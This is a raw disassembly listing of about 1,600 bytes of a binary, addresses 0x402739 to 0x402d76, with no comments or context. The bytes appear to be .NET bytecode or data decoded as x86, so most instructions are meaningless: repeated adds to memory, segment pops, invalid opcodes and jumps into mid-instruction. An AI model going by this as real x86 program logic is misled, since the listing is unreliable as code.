  402739:	jle    0x402742
  40273b:	add    BYTE PTR [eax],al
  40273d:	add    al,0x72
  40273f:	imul   eax,DWORD PTR [edx],0x87e7000
  402745:	add    BYTE PTR [eax],al
  402747:	add    al,0x6f
  402749:	add    BYTE PTR es:[eax],al
  40274c:	or     ch,BYTE PTR [eax]
  40274e:	and    DWORD PTR [eax],eax
  402750:	add    BYTE PTR [edx],cl
  402752:	jle    0x40275b
  402754:	add    BYTE PTR [eax],al
  402756:	add    al,0x72
  402758:	jns    0x40275c
  40275a:	add    BYTE PTR [eax+0x7e],dh
  40275d:	or     BYTE PTR [eax],al
  40275f:	add    BYTE PTR [edi+ebp*2],al
  402762:	add    BYTE PTR es:[eax],al
  402765:	or     ch,BYTE PTR [eax]
  402767:	and    DWORD PTR [eax],eax
  402769:	add    BYTE PTR [edx],cl
  40276b:	jle    0x402774
  40276d:	add    BYTE PTR [eax],al
  40276f:	add    al,0x72
  402771:	add    DWORD PTR [edx],0x0
  402774:	jo     0x4027f4
  402776:	or     BYTE PTR [eax],al
  402778:	add    BYTE PTR [edi+ebp*2],al
  40277b:	add    BYTE PTR es:[eax],al
  40277e:	or     ch,BYTE PTR [eax]
  402780:	and    DWORD PTR [eax],eax
  402782:	add    BYTE PTR [edx],cl
  402784:	jle    0x40278d
  402786:	add    BYTE PTR [eax],al
  402788:	add    al,0x72
  40278a:	xchg   ebp,eax
  40278b:	add    al,BYTE PTR [eax]
  40278d:	jo     0x40280d
  40278f:	or     BYTE PTR [eax],al
  402791:	add    BYTE PTR [edi+ebp*2],al
  402794:	add    BYTE PTR es:[eax],al
  402797:	or     ch,BYTE PTR [eax]
  402799:	and    DWORD PTR [eax],eax
  40279b:	add    BYTE PTR [edx],cl
  40279d:	jle    0x4027a6
  40279f:	add    BYTE PTR [eax],al
  4027a1:	add    al,0x72
  4027a3:	stos   DWORD PTR es:[edi],eax
  4027a4:	add    al,BYTE PTR [eax]
  4027a6:	jo     0x402826
  4027a8:	or     BYTE PTR [eax],al
  4027aa:	add    BYTE PTR [edi+ebp*2],al
  4027ad:	add    BYTE PTR es:[eax],al
  4027b0:	or     ch,BYTE PTR [eax]
  4027b2:	and    DWORD PTR [eax],eax
  4027b4:	add    BYTE PTR [edx],cl
  4027b6:	jb     0x402773
  4027b8:	add    al,BYTE PTR [eax]
  4027ba:	jo     0x4027e4
  4027bc:	and    DWORD PTR [eax],eax
  4027be:	add    BYTE PTR [edx],cl
  4027c0:	adc    eax,0x1b00002a
  4027c5:	xor    BYTE PTR [eax+eax*1],al
  4027c8:	bound  eax,QWORD PTR [ecx]
  4027ca:	add    BYTE PTR [eax],al
  4027cc:	add    al,BYTE PTR [eax]
  4027ce:	add    BYTE PTR [ecx],dl
  4027d0:	pop    ss
  4027d1:	or     al,BYTE PTR ds:0x58725416
  4027d7:	add    eax,DWORD PTR [eax]
  4027d9:	jo     0x4027e6
  4027db:	add    ch,BYTE PTR [eax+ecx*1]
  4027de:	add    ch,BYTE PTR [edi+0x2a]
  4027e1:	add    BYTE PTR [eax],al
  4027e3:	or     ch,BYTE PTR ds:0x5b7207
  4027e9:	add    BYTE PTR [eax+0x10],dh
  4027ec:	add    BYTE PTR [edx],al
  4027ee:	sub    BYTE PTR [eax],ch
  4027f0:	add    BYTE PTR [eax],al
  4027f2:	or     ch,BYTE PTR [edi+0x29]
  4027f5:	add    BYTE PTR [eax],al
  4027f7:	or     ah,BYTE PTR ds:0x9742c0d
  4027fd:	jb     0x40285f
  4027ff:	add    eax,DWORD PTR [eax]
  402801:	jo     0x40282b
  402803:	and    eax,0x2d0a0000
  402808:	or     DWORD PTR ss:[edx+0x66],esi
  40280c:	add    eax,DWORD PTR [eax]
  40280e:	jo     0x402838
  402810:	and    eax,0x2d0a0000
  402815:	xor    al,0x9
  402817:	jb     0x402885
  402819:	add    eax,DWORD PTR [eax]
  40281b:	jo     0x402845
  40281d:	and    eax,0x2d0a0000
  402822:	xor    cl,BYTE PTR [ecx]
  402824:	jb     0x402898
  402826:	add    eax,DWORD PTR [eax]
  402828:	jo     0x402852
  40282a:	and    eax,0x2d0a0000
  40282f:	xor    BYTE PTR [ecx],cl
  402831:	jb     0x40288e
  402833:	add    BYTE PTR [eax],al
  402835:	jo     0x40285f
  402837:	and    eax,0x2d0a0000
  40283c:	sub    esi,DWORD PTR cs:[ecx]
  40283f:	jb     0x4028b9
  402841:	add    eax,DWORD PTR [eax]
  402843:	jo     0x402850
  402845:	add    eax,0x4c2b5418
  40284a:	jb     0x4027cc
  40284c:	add    eax,DWORD PTR [eax]
  40284e:	jo     0x40285b
  402850:	add    eax,0x412b5417
  402855:	jb     0x4027df
  402857:	add    eax,DWORD PTR [eax]
  402859:	jo     0x402866
  40285b:	add    eax,0x362b5419
  402860:	jb     0x4027f4
  402862:	add    eax,DWORD PTR [eax]
  402864:	jo     0x402871
  402866:	add    eax,0x2b2b541a
  40286b:	add    eax,0x262b5416
  402870:	jle    0x402879
  402872:	add    BYTE PTR [eax],al
  402874:	add    al,0x72
  402876:	pushf  
  402877:	add    eax,DWORD PTR [eax]
  402879:	jo     0x4028f9
  40287b:	or     BYTE PTR [eax],al
  40287d:	add    BYTE PTR [edi+ebp*2],al
  402880:	add    BYTE PTR es:[eax],al
  402883:	or     dh,BYTE PTR [edx+0x1f]
  402886:	add    DWORD PTR [eax],eax
  402888:	jo     0x40288c
  40288a:	sub    BYTE PTR [esi],ch
  40288c:	add    BYTE PTR [eax],al
  40288e:	or     ch,BYTE PTR [eax]
  402890:	and    DWORD PTR [eax],eax
  402892:	add    BYTE PTR [edx],cl
  402894:	push   ss
  402895:	sub    al,BYTE PTR [esi]
  402897:	sub    al,0x6f
  402899:	add    edx,DWORD PTR [eax+0x6f]
  40289c:	sub    al,BYTE PTR [eax]
  40289e:	add    BYTE PTR [edx],cl
  4028a0:	sub    eax,0x277e66
  4028a5:	add    BYTE PTR [edx],cl
  4028a7:	or     al,0x4
  4028a9:	pop    ds
  4028aa:	pop    edi
  4028ab:	outs   dx,DWORD PTR ds:[esi]
  4028ac:	das    
  4028ad:	add    BYTE PTR [eax],al
  4028af:	or     dl,BYTE PTR [esi]
  4028b1:	xor    DWORD PTR [ebx],esp
  4028b3:	add    al,0x16
  4028b5:	add    al,0x1f
  4028b7:	pop    edi
  4028b8:	outs   dx,DWORD PTR ds:[esi]
  4028b9:	das    
  4028ba:	add    BYTE PTR [eax],al
  4028bc:	or     ch,BYTE PTR [edi+0x30]
  4028bf:	add    BYTE PTR [eax],al
  4028c1:	or     cl,BYTE PTR [esp+eax*1]
  4028c4:	add    al,0x1f
  4028c6:	pop    edi
  4028c7:	outs   dx,DWORD PTR ds:[esi]
  4028c8:	das    
  4028c9:	add    BYTE PTR [eax],al
  4028cb:	or     dl,BYTE PTR [edi]
  4028cd:	pop    eax
  4028ce:	outs   dx,DWORD PTR ds:[esi]
  4028cf:	xor    DWORD PTR [eax],eax
  4028d1:	add    BYTE PTR [edx],cl
  4028d3:	or     al,0x2b
  4028d5:	add    al,BYTE PTR [esp+ecx*1]
  4028d8:	add    ecx,DWORD PTR [eax]
  4028da:	pop    es
  4028db:	sub    BYTE PTR [edx],dh
  4028dd:	add    BYTE PTR [eax],al
  4028df:	or     dl,BYTE PTR [ecx+0x3]
  4028e2:	add    edx,DWORD PTR [eax+0x28]
  4028e5:	xor    eax,DWORD PTR [eax]
  4028e7:	add    BYTE PTR [edx],cl
  4028e9:	push   ecx
  4028ea:	fiadd  WORD PTR [esi+eiz*1+0x8]
  4028ee:	push   ss
  4028ef:	or     BYTE PTR [edi+0x2a],ch
  4028f2:	add    BYTE PTR [eax],al
  4028f4:	or     dl,BYTE PTR [edi]
  4028f6:	pop    ecx
  4028f7:	outs   dx,DWORD PTR ds:[esi]
  4028f8:	xor    BYTE PTR [eax],al
  4028fa:	add    BYTE PTR [edx],cl
  4028fc:	or     al,0x3
  4028fe:	or     BYTE PTR [edi],al
  402900:	sub    BYTE PTR [edx],dh
  402902:	add    BYTE PTR [eax],al
  402904:	or     dl,BYTE PTR [ecx-0x22]
  402907:	fld    DWORD PTR [ebx]
  402909:	push   eax
  40290a:	sub    BYTE PTR [ebx],dh
  40290c:	add    BYTE PTR [eax],al
  40290e:	or     ah,BYTE PTR [esi]
  402910:	ficomp WORD PTR [esi]
  402912:	es jle 0x40291c
  402915:	add    BYTE PTR [eax],al
  402917:	add    al,0x72
  402919:	mov    edx,0x7e700003
  40291e:	or     BYTE PTR [eax],al
  402920:	add    BYTE PTR [edi+ebp*2],al
  402923:	add    BYTE PTR es:[eax],al
  402926:	or     ch,BYTE PTR [eax]
  402928:	and    DWORD PTR [eax],eax
  40292a:	add    BYTE PTR [edx],cl
  40292c:	push   ss
  40292d:	or     bl,dh
  40292f:	add    BYTE PTR [esi],al
  402931:	sub    al,BYTE PTR [eax]
  402933:	add    BYTE PTR [ecx],al
  402935:	sbb    al,0x0
  402937:	add    BYTE PTR [eax],al
  402939:	add    BYTE PTR [ecx],dl
  40293b:	add    DWORD PTR [ebx],ecx
  40293d:	sbb    al,0x1
  40293f:	sbb    al,0x2a
  402941:	add    BYTE PTR [eax],al
  402943:	add    DWORD PTR [eax],eax
  402945:	add    BYTE PTR [eax],bh
  402947:	add    DWORD PTR [edx],ecx
  402949:	inc    edx
  40294a:	add    DWORD PTR [esi],ebx
  40294c:	sub    al,BYTE PTR [eax]
  40294e:	add    BYTE PTR [ecx],al
  402950:	sbb    esi,DWORD PTR [eax]
  402952:	add    al,0x0
  402954:	push   esp
  402955:	add    DWORD PTR [eax],eax
  402957:	add    BYTE PTR [ebx],al
  402959:	add    BYTE PTR [eax],al
  40295b:	adc    DWORD PTR [edx],eax
  40295d:	adc    al,0x51
  40295f:	adc    al,0xa
  402961:	adc    al,0xb
  402963:	jle    0x402969
  402965:	add    BYTE PTR [eax],al
  402967:	add    al,0x6f
  402969:	sub    al,BYTE PTR [eax]
  40296b:	add    BYTE PTR [edx],cl
  40296d:	sub    al,0x2c
  40296f:	jae    0x4029a5
  402971:	add    BYTE PTR [eax],al
  402973:	or     cl,BYTE PTR [edx]
  402975:	push   es
  402976:	jle    0x40297c
  402978:	add    BYTE PTR [eax],al
  40297a:	add    al,0x6f
  40297c:	xor    eax,0x60a0000
  402981:	jle    0x402988
  402983:	add    BYTE PTR [eax],al
  402985:	add    al,0x6f
  402987:	or     al,BYTE PTR [eax]
  402989:	add    BYTE PTR [esi],al
  40298b:	outs   dx,DWORD PTR ds:[esi]
  40298c:	add    BYTE PTR ss:[eax],al
  40298f:	or     al,BYTE PTR [esi]
  402991:	jle    0x402999
  402993:	add    BYTE PTR [eax],al
  402995:	add    al,0x6f
  402997:	aaa    
  402998:	add    BYTE PTR [eax],al
  40299a:	or     dh,BYTE PTR [ebx+0x38]
  40299d:	add    BYTE PTR [eax],al
  40299f:	or     cl,BYTE PTR [ebx]
  4029a1:	pop    es
  4029a2:	jle    0x4029a7
  4029a4:	add    BYTE PTR [eax],al
  4029a6:	add    al,0x6f
  4029a8:	cmp    DWORD PTR [eax],eax
  4029aa:	add    BYTE PTR [edx],cl
  4029ac:	pop    es
  4029ad:	outs   dx,DWORD PTR ds:[esi]
  4029ae:	cmp    al,BYTE PTR [eax]
  4029b0:	add    BYTE PTR [edx],cl
  4029b2:	outs   dx,DWORD PTR ds:[esi]
  4029b3:	sub    al,BYTE PTR [eax]
  4029b5:	add    BYTE PTR [edx],cl
  4029b7:	sub    al,0xd
  4029b9:	pop    es
  4029ba:	outs   dx,DWORD PTR ds:[esi]
  4029bb:	cmp    al,BYTE PTR [eax]
  4029bd:	add    BYTE PTR [edx],cl
  4029bf:	outs   dx,DWORD PTR ds:[esi]
  4029c0:	sub    al,BYTE PTR [eax]
  4029c2:	add    BYTE PTR [edx],cl
  4029c4:	sub    eax,0x70c174f
  4029c9:	jle    0x4029cd
  4029cb:	add    BYTE PTR [eax],al
  4029cd:	add    al,0x6f
  4029cf:	cmp    eax,DWORD PTR [eax]
  4029d1:	add    BYTE PTR [edx],cl
  4029d3:	pop    es
  4029d4:	outs   dx,DWORD PTR ds:[esi]
  4029d5:	cmp    al,BYTE PTR [eax]
  4029d7:	add    BYTE PTR [edx],cl
  4029d9:	outs   dx,DWORD PTR ds:[esi]
  4029da:	sub    al,BYTE PTR [eax]
  4029dc:	add    BYTE PTR [edx],cl
  4029de:	sub    eax,0x80c1602
  4029e3:	sub    eax,0x77e3b
  4029e8:	add    BYTE PTR [edx+esi*2],al
  4029eb:	loopne 0x4029f0
  4029ed:	add    BYTE PTR [eax+0x7e],dh
  4029f0:	or     BYTE PTR [eax],al
  4029f2:	add    BYTE PTR [edi+ebp*2],al
  4029f5:	add    BYTE PTR es:[eax],al
  4029f8:	or     dh,BYTE PTR [edx+0x1f]
  4029fb:	add    DWORD PTR [eax],eax
  4029fd:	jo     0x402a7d
  4029ff:	add    al,BYTE PTR [eax]
  402a01:	add    BYTE PTR [eax+ebp*1],al
  402a04:	add    BYTE PTR cs:[eax],al
  402a07:	or     ch,BYTE PTR [eax]
  402a09:	and    DWORD PTR [eax],eax
  402a0b:	add    BYTE PTR [edx],cl
  402a0d:	push   ss
  402a0e:	adc    eax,DWORD PTR [esi]
  402a10:	fstp   QWORD PTR [eax+0x7000000]
  402a16:	outs   dx,DWORD PTR ds:[esi]
  402a17:	cmp    al,BYTE PTR [eax]
  402a19:	add    BYTE PTR [edx],cl
  402a1b:	add    BYTE PTR [edx],0x0
  402a1e:	add    BYTE PTR [esi+edi*2],al
  402a21:	add    DWORD PTR [eax],eax
  402a23:	add    BYTE PTR [edi+ebp*2],al
  402a26:	sub    al,BYTE PTR [eax]
  402a28:	add    BYTE PTR [edx],cl
  402a2a:	sub    al,0xb
  402a2c:	pop    es
  402a2d:	jle    0x402a30
  402a2f:	add    BYTE PTR [eax],al
  402a31:	add    al,0x6f
  402a33:	cmp    al,0x0
  402a35:	add    BYTE PTR [edx],cl
  402a37:	jae    0x402a76
  402a39:	add    BYTE PTR [eax],al
  402a3b:	or     cl,BYTE PTR ds:0x3e6f1709
  402a41:	add    BYTE PTR [eax],al
  402a43:	or     al,BYTE PTR [esi]
  402a45:	sub    al,0x16
  402a47:	pop    es
  402a48:	push   es
  402a49:	jae    0x402a8a
  402a4b:	add    BYTE PTR [eax],al
  402a4d:	or     dl,BYTE PTR [ebx]
  402a4f:	add    al,0x2
  402a51:	adc    DWORD PTR [edi+eax*1],eax
  402a54:	or     DWORD PTR [ebx+0x40],esi
  402a57:	add    BYTE PTR [eax],al
  402a59:	or     dl,BYTE PTR [ecx+0x2b]
  402a5c:	or     DWORD PTR [edx],eax
  402a5e:	pop    es
  402a5f:	or     DWORD PTR [ebx+0x41],esi
  402a62:	add    BYTE PTR [eax],al
  402a64:	or     dl,BYTE PTR [ecx+0x2]
  402a67:	push   eax
  402a68:	outs   dx,DWORD PTR ds:[esi]
  402a69:	inc    edx
  402a6a:	add    BYTE PTR [eax],al
  402a6c:	or     al,BYTE PTR [edi]
  402a6e:	outs   dx,DWORD PTR ds:[esi]
  402a6f:	inc    ebx
  402a70:	add    BYTE PTR [eax],al
  402a72:	or     al,BYTE PTR [eax+0x4000003]
  402a78:	pop    ss
  402a79:	adc    eax,DWORD PTR [esi]
  402a7b:	fidiv  WORD PTR [eax]
  402a7d:	adc    eax,DWORD PTR ds:0x446f0511
  402a83:	add    BYTE PTR [eax],al
  402a85:	or     ah,BYTE PTR [eax]
  402a87:	add    dl,BYTE PTR [eax]
  402a89:	add    al,0x80
  402a8b:	xor    ebx,DWORD PTR [esi]
  402a8d:	jle    0x402a96
  402a8f:	add    BYTE PTR [eax],al
  402a91:	add    al,0x72
  402a93:	add    al,BYTE PTR [eax+eax*1]
  402a96:	jo     0x402b16
  402a98:	or     BYTE PTR [eax],al
  402a9a:	add    BYTE PTR [edi+ebp*2],al
  402a9d:	add    BYTE PTR es:[eax],al
  402aa0:	or     ch,BYTE PTR [eax]
  402aa2:	and    DWORD PTR [eax],eax
  402aa4:	add    BYTE PTR [edx],cl
  402aa6:	push   ss
  402aa7:	adc    eax,DWORD PTR [esi]
  402aa9:	fiadd  WORD PTR [edx]
  402aab:	(bad)  
  402aac:	sbb    dl,BYTE PTR [ecx]
  402aae:	push   es
  402aaf:	sub    al,BYTE PTR [ecx+0x1c]
  402ab2:	add    BYTE PTR [eax],al
  402ab4:	add    BYTE PTR [eax],al
  402ab6:	add    BYTE PTR [eax],al
  402ab8:	add    eax,DWORD PTR [eax]
  402aba:	add    BYTE PTR [eax],al
  402abc:	push   ds
  402abd:	add    DWORD PTR [eax],eax
  402abf:	add    BYTE PTR [ecx],ah
  402ac1:	add    DWORD PTR [eax],eax
  402ac3:	add    BYTE PTR [eax],dh
  402ac5:	add    BYTE PTR [eax],al
  402ac7:	add    BYTE PTR [eax],dh
  402ac9:	add    BYTE PTR [eax],al
  402acb:	add    DWORD PTR [ebx],edx
  402acd:	xor    BYTE PTR [eax+eax*1],al
  402ad0:	imul   eax,DWORD PTR [eax],0x40000
  402ad6:	add    BYTE PTR [ecx],dl
  402ad8:	jle    0x402b01
  402ada:	add    BYTE PTR [eax],al
  402adc:	or     cl,BYTE PTR [edx]
  402ade:	pop    ds
  402adf:	xor    BYTE PTR [ebx],cl
  402ae1:	sub    eax,DWORD PTR [edi+0x28]
  402ae4:	or     eax,DWORD PTR [eax]
  402ae6:	add    BYTE PTR [esi],al
  402ae8:	ror    DWORD PTR [ebx],1
  402aea:	pop    es
  402aeb:	push   ds
  402aec:	xor    ebp,DWORD PTR [edx]
  402aee:	push   es
  402aef:	outs   dx,DWORD PTR ds:[esi]
  402af0:	sub    al,BYTE PTR [eax]
  402af2:	add    BYTE PTR [edx],cl
  402af4:	pop    ss
  402af5:	xor    eax,DWORD PTR [esi]
  402af7:	jle    0x402b20
  402af9:	add    BYTE PTR [eax],al
  402afb:	or     cl,BYTE PTR [edx]
  402afd:	push   es
  402afe:	outs   dx,DWORD PTR ds:[esi]
  402aff:	sub    al,BYTE PTR [eax]
  402b01:	add    BYTE PTR [edx],cl
  402b03:	push   ss
  402b04:	xor    DWORD PTR [esi+eax*1],esp
  402b07:	push   ss
  402b08:	push   es
  402b09:	outs   dx,DWORD PTR ds:[esi]
  402b0a:	sub    al,BYTE PTR [eax]
  402b0c:	add    BYTE PTR [edx],cl
  402b0e:	pop    ss
  402b0f:	pop    ecx
  402b10:	outs   dx,DWORD PTR ds:[esi]
  402b11:	xor    BYTE PTR [eax],al
  402b13:	add    BYTE PTR [edx],cl
  402b15:	or     ch,BYTE PTR [ebx]
  402b17:	adc    al,BYTE PTR [edi]
  402b19:	pop    ds
  402b1a:	or     eax,0x7060d2e
  402b1f:	mov    WORD PTR [edx],?
  402b21:	add    BYTE PTR [eax],al
  402b23:	add    DWORD PTR [eax],ebp
  402b25:	inc    ebp
  402b26:	add    BYTE PTR [eax],al
  402b28:	or     cl,BYTE PTR [edx]
  402b2a:	pop    es
  402b2b:	pop    ds
  402b2c:	or     eax,0x7306b433
  402b31:	or     BYTE PTR [eax],al
  402b33:	add    BYTE PTR [esi],al
  402b35:	add    BYTE PTR ds:0x7e040000,0x27
  402b3c:	add    BYTE PTR [eax],al
  402b3e:	or     cl,BYTE PTR [edx]
  402b40:	sub    bh,dh
  402b42:	jle    0x402b6b
  402b44:	add    BYTE PTR [eax],al
  402b46:	or     al,BYTE PTR [eax+0x4000001]
  402b4c:	jb     0x402b72
  402b4e:	add    al,0x0
  402b50:	jo     0x402ad2
  402b52:	add    al,BYTE PTR [eax]
  402b54:	add    BYTE PTR [esi+edi*2],al
  402b57:	daa    
  402b58:	add    BYTE PTR [eax],al
  402b5a:	or     al,BYTE PTR [eax+0x4000003]
  402b60:	jle    0x402b89
  402b62:	add    BYTE PTR [eax],al
  402b64:	or     al,BYTE PTR [eax+0x4000004]
  402b6a:	adc    al,0x80
  402b6c:	add    eax,0x7e040000
  402b71:	daa    
  402b72:	add    BYTE PTR [eax],al
  402b74:	or     al,BYTE PTR [eax+0x4000006]
  402b7a:	adc    al,0x80
  402b7c:	or     BYTE PTR [eax],al
  402b7e:	add    BYTE PTR [edx+ebp*1],al
  402b81:	cmp    al,BYTE PTR [edx]
  402b83:	sub    BYTE PTR [edi],dl
  402b85:	add    BYTE PTR [eax],al
  402b87:	or     al,BYTE PTR [edx]
  402b89:	add    ebp,DWORD PTR [eax]
  402b8b:	or     DWORD PTR [eax],eax
  402b8d:	add    BYTE PTR [esi],al
  402b8f:	sub    dl,BYTE PTR [ebx]
  402b91:	xor    BYTE PTR [esi],al
  402b93:	add    BYTE PTR [ecx+0x0],ah
  402b96:	add    BYTE PTR [eax],al
  402b98:	add    eax,0x3110000
  402b9d:	sub    al,0x56
  402b9f:	add    bh,BYTE PTR [ebx+0xa]
  402ba2:	add    BYTE PTR [eax],al
  402ba4:	add    al,0x2d
  402ba6:	and    DWORD PTR [edx],eax
  402ba8:	sub    BYTE PTR [esi+0x0],al
  402bab:	add    BYTE PTR [edx],cl
  402bad:	jge    0x402bb9
  402baf:	add    BYTE PTR [eax],al
  402bb1:	add    al,0x2
  402bb3:	jnp    0x402bbf
  402bb5:	add    BYTE PTR [eax],al
  402bb7:	add    al,0x6f
  402bb9:	inc    edi
  402bba:	add    BYTE PTR [eax],al
  402bbc:	or     al,BYTE PTR [edx]
  402bbe:	jnp    0x402bca
  402bc0:	add    BYTE PTR [eax],al
  402bc2:	add    al,0x6f
  402bc4:	dec    eax
  402bc5:	add    BYTE PTR [eax],al
  402bc7:	or     al,BYTE PTR [edx]
  402bc9:	jnp    0x402bd5
  402bcb:	add    BYTE PTR [eax],al
  402bcd:	add    al,0x6f
  402bcf:	dec    ecx
  402bd0:	add    BYTE PTR [eax],al
  402bd2:	or     cl,BYTE PTR [edx]
  402bd4:	add    al,BYTE PTR [esi]
  402bd6:	sub    BYTE PTR [edx+0x0],cl
  402bd9:	add    BYTE PTR [edx],cl
  402bdb:	add    ebp,DWORD PTR [edi+0x4b]
  402bde:	add    BYTE PTR [eax],al
  402be0:	or     dl,BYTE PTR [esi]
  402be2:	add    ebp,DWORD PTR [edi+0x2a]
  402be5:	add    BYTE PTR [eax],al
  402be7:	or     bl,BYTE PTR [eax]
  402be9:	pop    edx
  402bea:	outs   dx,DWORD PTR ds:[esi]
  402beb:	dec    esp
  402bec:	add    BYTE PTR [eax],al
  402bee:	or     bh,BYTE PTR [ebp+0x9]
  402bf1:	add    BYTE PTR [eax],al
  402bf3:	add    al,0x2a
  402bf5:	add    dl,BYTE PTR [edi*2+0x4000009]
  402bfc:	sub    al,BYTE PTR [eax]
  402bfe:	add    BYTE PTR [eax],al
  402c00:	adc    esi,DWORD PTR [eax]
  402c02:	add    eax,0x3e00
  402c07:	add    BYTE PTR ds:0x2110000,al
  402c0d:	jnp    0x402c18
  402c0f:	add    BYTE PTR [eax],al
  402c11:	add    al,0x2c
  402c13:	xor    al,0x2
  402c15:	jnp    0x402c21
  402c17:	add    BYTE PTR [eax],al
  402c19:	add    al,0x2c
  402c1b:	sub    al,0x2
  402c1d:	jnp    0x402c29
  402c1f:	add    BYTE PTR [eax],al
  402c21:	add    al,0x6f
  402c23:	dec    ebp
  402c24:	add    BYTE PTR [eax],al
  402c26:	or     cl,BYTE PTR [edx]
  402c28:	sub    BYTE PTR [edx+0x0],cl
  402c2b:	add    BYTE PTR [edx],cl
  402c2d:	push   es
  402c2e:	add    bh,BYTE PTR [ebx+0x9]
  402c31:	add    BYTE PTR [eax],al
  402c33:	add    al,0x16
  402c35:	add    bh,BYTE PTR [ebx+0x9]
  402c38:	add    BYTE PTR [eax],al
  402c3a:	add    al,0x8e
  402c3c:	imul   ebp,DWORD PTR [edi+0x4c],0x6f0a0000
  402c43:	dec    esi
  402c44:	add    BYTE PTR [eax],al
  402c46:	or     ch,BYTE PTR [edx]
  402c48:	adc    al,0x2a
  402c4a:	push   ds
  402c4b:	add    ch,BYTE PTR [eax]
  402c4d:	pop    ss
  402c4e:	add    BYTE PTR [eax],al
  402c50:	or     ch,BYTE PTR [edx]
  402c52:	and    al,BYTE PTR [edx]
  402c54:	add    ebp,DWORD PTR [eax]
  402c56:	push   ecx
  402c57:	add    BYTE PTR [eax],al
  402c59:	or     ch,BYTE PTR [edx]
  402c5b:	sahf   
  402c5c:	add    bh,BYTE PTR [ebx+0x5a]
  402c5f:	add    BYTE PTR [eax],al
  402c61:	add    al,0x2d
  402c63:	sbb    BYTE PTR [edx],al
  402c65:	pop    ss
  402c66:	jge    0x402cc2
  402c68:	add    BYTE PTR [eax],al
  402c6a:	add    al,0x2
  402c6c:	add    ch,BYTE PTR [eax]
  402c6e:	push   edx
  402c6f:	add    BYTE PTR [eax],al
  402c71:	or     ch,BYTE PTR [eax]
  402c73:	push   ss
  402c74:	add    BYTE PTR [eax],al
  402c76:	push   es
  402c77:	sub    BYTE PTR [ebx+0x0],dl
  402c7a:	add    BYTE PTR [edx],cl
  402c7c:	add    ch,BYTE PTR [eax]
  402c7e:	push   edx
  402c7f:	add    BYTE PTR [eax],al
  402c81:	or     ch,BYTE PTR [edx]
  402c83:	and    al,BYTE PTR [edx]
  402c85:	add    ebp,DWORD PTR [eax]
  402c87:	push   esp
  402c88:	add    BYTE PTR [eax],al
  402c8a:	or     ch,BYTE PTR [edx]
  402c8c:	push   ds
  402c8d:	add    ebp,DWORD PTR [eax]
  402c8f:	push   ss
  402c90:	add    BYTE PTR [eax],al
  402c92:	push   es
  402c93:	sub    cl,BYTE PTR [edx+0x172802]
  402c99:	add    BYTE PTR [edx],cl
  402c9b:	add    dh,BYTE PTR [edx+0x3a]
  402c9e:	add    al,0x0
  402ca0:	jo     0x402ca4
  402ca2:	sub    BYTE PTR [ebp+0x0],dl
  402ca5:	add    BYTE PTR [edx],cl
  402ca7:	outs   dx,DWORD PTR ds:[esi]
  402ca8:	push   esi
  402ca9:	add    BYTE PTR [eax],al
  402cab:	or     dh,BYTE PTR [ebx+0x57]
  402cae:	add    BYTE PTR [eax],al
  402cb0:	or     bh,BYTE PTR [ebp+0x76]
  402cb3:	add    BYTE PTR [eax],al
  402cb5:	add    al,0x2a
  402cb7:	add    BYTE PTR [ebx],dl
  402cb9:	xor    BYTE PTR [ebx],al
  402cbb:	add    BYTE PTR [eax],ah
  402cbd:	add    BYTE PTR [eax],al
  402cbf:	add    BYTE PTR [esi],al
  402cc1:	add    BYTE PTR [eax],al
  402cc3:	adc    DWORD PTR [esi+0x75],edi
  402cc6:	add    BYTE PTR [eax],al
  402cc8:	add    al,0x2d
  402cca:	adc    esi,DWORD PTR [ebx+0x11]
  402ccd:	add    BYTE PTR [eax],al
  402ccf:	push   es
  402cd0:	or     bh,BYTE PTR [edi+0x75]
  402cd3:	add    BYTE PTR [eax],al
  402cd5:	add    al,0x6
  402cd7:	adc    al,0x28
  402cd9:	add    DWORD PTR [eax],eax
  402cdb:	add    BYTE PTR [ebx],ch
  402cdd:	es jle 0x402d55
  402ce0:	add    BYTE PTR [eax],al
  402ce2:	add    al,0x2a
  402ce4:	or     dl,BYTE PTR [edx+ebp*1]
  402ce7:	sub    BYTE PTR cs:[edx],dl
  402cea:	add    BYTE PTR [eax],al
  402cec:	push   es
  402ced:	jnp    0x402d65
  402cef:	add    BYTE PTR [eax],al
  402cf1:	add    al,0x2a
  402cf3:	add    BYTE PTR [ebx],dl
  402cf5:	xor    BYTE PTR ds:0x7500,al
  402cfb:	add    BYTE PTR [edi],al
  402cfd:	add    BYTE PTR [eax],al
  402cff:	adc    DWORD PTR [eax],ebp
  402d01:	adc    al,BYTE PTR [eax]
  402d03:	add    BYTE PTR [esi],al
  402d05:	or     al,BYTE PTR [esi]
  402d07:	sub    eax,0x62a1402
  402d0c:	jnp    0x402d84
  402d0e:	add    BYTE PTR [eax],al
  402d10:	add    al,0x2
  402d12:	sub    BYTE PTR [ebx],dl
  402d14:	add    BYTE PTR [eax],al
  402d16:	push   es
  402d17:	outs   dx,DWORD PTR ds:[esi]
  402d18:	add    BYTE PTR es:[eax],al
  402d1b:	or     cl,BYTE PTR [ebx]
  402d1d:	add    ebp,DWORD PTR [ebx+edx*2]
  402d20:	add    ecx,DWORD PTR [esi+0x4d311669]
  402d26:	push   ss
  402d27:	or     al,0x2b
  402d29:	add    ecx,DWORD PTR ss:[eax]
  402d2c:	call   0xd01:0x2575
  402d33:	or     DWORD PTR [esi+eiz*1],ebp
  402d36:	or     DWORD PTR [edi+0x2a],ebp
  402d39:	add    BYTE PTR [eax],al
  402d3b:	or     ah,BYTE PTR [eax]
  402d3d:	add    BYTE PTR [eax+eax*1],al
  402d40:	add    BYTE PTR [ecx],dh
  402d42:	sbb    DWORD PTR [ebx],eax
  402d44:	or     BYTE PTR [ecx],cl
  402d46:	push   ss
  402d47:	and    ch,bh
  402d49:	add    eax,DWORD PTR [eax]
  402d4b:	add    BYTE PTR [edi+0x30],ch
  402d4e:	add    BYTE PTR [eax],al
  402d50:	or     dh,BYTE PTR [edx+0x54]
  402d53:	add    al,0x0
  402d55:	jo     0x402d7f
  402d57:	xor    al,BYTE PTR [eax]
  402d59:	add    BYTE PTR [edx],cl
  402d5b:	mov    ds:0xc581708,al
  402d60:	or     BYTE PTR [ebx],al
  402d62:	mov    gs,WORD PTR [ecx+0x32]
  402d65:	les    ebp,FWORD PTR [eax]
  402d67:	pop    ecx
  402d68:	add    BYTE PTR [eax],al
  402d6a:	or     al,BYTE PTR [edi]
  402d6c:	add    ebp,DWORD PTR [eax]
  402d6e:	pop    edx
  402d6f:	add    BYTE PTR [eax],al
  402d71:	or     ch,BYTE PTR [edx]
  402d73:	pop    es
  402d74:	sub    al,BYTE PTR [eax]
  402d76:	add    BYTE PTR [eax],al
